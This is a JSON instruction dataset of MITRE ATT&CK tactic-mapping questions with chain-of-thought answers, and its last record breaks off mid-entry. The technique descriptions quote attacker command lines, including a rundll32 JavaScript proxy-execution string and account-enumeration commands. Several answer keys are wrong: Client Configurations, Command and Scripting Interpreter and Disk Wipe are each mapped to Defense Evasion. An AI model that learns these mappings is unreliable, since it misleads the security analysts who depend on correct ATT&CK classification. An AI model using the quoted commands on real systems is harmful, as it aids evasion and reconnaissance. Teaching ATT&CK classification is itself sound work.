    "output": "The given description is related to sub technique: Rundll32 (T1218.011);\nSub technique Rundll32 (T1218.011) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject\"</code>  This behavior has been seen used by malware such as Poweliks. \n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",
      "answer": "The given description is related to sub technique: Rundll32 (T1218.011);\nSub technique Rundll32 (T1218.011) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
    "context": "",
    "output": "The given description is related to sub technique: Indicator Removal from Tools (T1027.005);\nSub technique Indicator Removal from Tools (T1027.005) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
      "answer": "The given description is related to sub technique: Indicator Removal from Tools (T1027.005);\nSub technique Indicator Removal from Tools (T1027.005) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).?",
    "context": "",
    "output": "The given description is related to sub technique: Client Configurations (T1592.004);\nSub technique Client Configurations (T1592.004) is a type of technique Gather Victim Host Information (T1592);\nTechnique Gather Victim Host Information (T1592) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).",
      "answer": "The given description is related to sub technique: Client Configurations (T1592.004);\nSub technique Client Configurations (T1592.004) is a type of technique Gather Victim Host Information (T1592);\nTechnique Gather Victim Host Information (T1592) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in Drive-by Compromise. In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as Application Access Token. Prior to Drive-by Compromise, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).\n\nAdversaries may upload or inject malicious web content, such as JavaScript, into websites. This may be done in a number of ways, including:\n\n* Inserting malicious scripts into web pages or other user controllable web content such as forum posts\n* Modifying script files served to websites from publicly writeable cloud storage buckets\n* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., Malvertising)\n\nIn addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in Gather Victim Host Information) to ensure it is vulnerable prior to attempting exploitation.\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Drive-by Compromise.?",
    "context": "",
    "output": "The given description is related to sub technique: Drive-by Target (T1608.004);\nSub technique Drive-by Target (T1608.004) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in Drive-by Compromise. In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as Application Access Token. Prior to Drive-by Compromise, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).\n\nAdversaries may upload or inject malicious web content, such as JavaScript, into websites. This may be done in a number of ways, including:\n\n* Inserting malicious scripts into web pages or other user controllable web content such as forum posts\n* Modifying script files served to websites from publicly writeable cloud storage buckets\n* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., Malvertising)\n\nIn addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in Gather Victim Host Information) to ensure it is vulnerable prior to attempting exploitation.\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Drive-by Compromise.",
      "answer": "The given description is related to sub technique: Drive-by Target (T1608.004);\nSub technique Drive-by Target (T1608.004) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n\nFor example, adversaries may construct or use onion routing networks \u2013 such as the publicly available Tor network \u2013 to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.\n\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., Network Devices). By leveraging Patch System Image on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the Network Boundary Bridging method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.\n\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.",
    "context": "",
    "output": "The given description is related to sub technique Multi-hop Proxy (T1090.003);\nSub technique Multi-hop Proxy (T1090.003) is a type of technique Proxy (T1090);\nTechnique Proxy (T1090) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n\nFor example, adversaries may construct or use onion routing networks \u2013 such as the publicly available Tor network \u2013 to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.\n\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., Network Devices). By leveraging Patch System Image on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the Network Boundary Bridging method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.\n\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.",
      "answer": "The given description is related to sub technique Multi-hop Proxy (T1090.003);\nSub technique Multi-hop Proxy (T1090.003) is a type of technique Proxy (T1090);\nTechnique Proxy (T1090) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.\n\nAdversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as Phishing payloads.\n\nThese scripts may also be compiled into self-contained executable payloads (`.exe`).",
    "context": "",
    "output": "The given description is related to sub technique: AutoHotKey & AutoIT (T1059.010);\nSub technique AutoHotKey & AutoIT (T1059.010) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.\n\nAdversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as Phishing payloads.\n\nThese scripts may also be compiled into self-contained executable payloads (`.exe`).",
      "answer": "The given description is related to sub technique: AutoHotKey & AutoIT (T1059.010);\nSub technique AutoHotKey & AutoIT (T1059.010) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting Reconnaissance, creating basic scripts, assisting social engineering, and even developing payloads.\n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in Phishing/Phishing for Information campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting Develop Capabilities. AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., Obfuscated Files or Information) malicious scripts and payloads.?",
    "context": "",
    "output": "The given description is related to sub technique Artificial Intelligence (T1588.007);\nSub technique Artificial Intelligence (T1588.007) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting Reconnaissance, creating basic scripts, assisting social engineering, and even developing payloads.\n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in Phishing/Phishing for Information campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting Develop Capabilities. AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., Obfuscated Files or Information) malicious scripts and payloads.",
      "answer": "The given description is related to sub technique Artificial Intelligence (T1588.007);\nSub technique Artificial Intelligence (T1588.007) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.     Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging.  Adding new capabilities for the adversary\u2019s purpose include Keylogging, Multi-hop Proxy, and Port Knocking.\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot. \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.",
    "context": "",
    "output": "The given description is related to sub technique Patch System Image (T1601.001);\nSub technique Patch System Image (T1601.001) is a type of technique Modify System Image (T1601);\nTechnique Modify System Image (T1601) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.     Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging.  Adding new capabilities for the adversary\u2019s purpose include Keylogging, Multi-hop Proxy, and Port Knocking.\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot. \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.",
      "answer": "The given description is related to sub technique Patch System Image (T1601.001);\nSub technique Patch System Image (T1601.001) is a type of technique Modify System Image (T1601);\nTechnique Modify System Image (T1601) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.?",
    "context": "",
    "output": "The given description is related to sub technique MSBuild (T1127.001);\nSub technique MSBuild (T1127.001) is a type of technique Trusted Developer Utilities Proxy Execution (T1127);\nTechnique Trusted Developer Utilities Proxy Execution (T1127) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.",
      "answer": "The given description is related to sub technique MSBuild (T1127.001);\nSub technique MSBuild (T1127.001) is a type of technique Trusted Developer Utilities Proxy Execution (T1127);\nTechnique Trusted Developer Utilities Proxy Execution (T1127) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have also been observed leveraging third-party drivers like RawDisk to directly access disk content. This behavior is distinct from Data Destruction because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.?",
    "context": "",
    "output": "The given description is related to sub technique: Disk Content Wipe (T1561.001);\nSub technique Disk Content Wipe (T1561.001) is a type of technique Disk Wipe (T1561);\nTechnique Disk Wipe (T1561) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have also been observed leveraging third-party drivers like RawDisk to directly access disk content. This behavior is distinct from Data Destruction because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.",
      "answer": "The given description is related to sub technique: Disk Content Wipe (T1561.001);\nSub technique Disk Content Wipe (T1561.001) is a type of technique Disk Wipe (T1561);\nTechnique Disk Wipe (T1561) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
    "context": "",
    "output": "The given description is related to sub technique Domain Groups (T1069.002);\nSub technique Domain Groups (T1069.002) is a type of technique Permission Groups Discovery (T1069);\nTechnique Permission Groups Discovery (T1069) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
      "answer": "The given description is related to sub technique Domain Groups (T1069.002);\nSub technique Domain Groups (T1069.002) is a type of technique Permission Groups Discovery (T1069);\nTechnique Permission Groups Discovery (T1069) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the Net utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.?",
    "context": "",
    "output": "The given description is related to sub technique Local Account (T1087.001);\nSub technique Local Account (T1087.001) is a type of technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the Net utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.",
      "answer": "The given description is related to sub technique Local Account (T1087.001);\nSub technique Local Account (T1087.001) is a type of technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application).?",
    "context": "",
    "output": "The given description is related to sub technique: Vulnerability Scanning (T1595.002);\nSub technique Vulnerability Scanning (T1595.002) is a type of technique Active Scanning (T1595);\nTechnique Active Scanning (T1595) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application).",
